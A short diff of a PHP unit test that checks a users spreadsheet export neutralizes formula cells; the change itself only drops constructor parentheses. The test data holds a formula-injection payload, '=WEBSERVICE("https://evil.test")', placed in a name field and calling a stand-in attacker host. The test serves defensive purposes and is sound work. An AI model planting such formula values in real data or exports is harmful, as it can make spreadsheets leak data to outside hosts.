@@ -20,7 +20,7 @@ class SpreadsheetExportSecurityTest extends TestCase
 
     public function test_user_export_neutralizes_formula_cells(): void
     {
-        $export = new UsersExport();
+        $export = new UsersExport;
         $row = $export->map((object) [
             'id' => 1,
             'name' => '=WEBSERVICE("https://evil.test")',
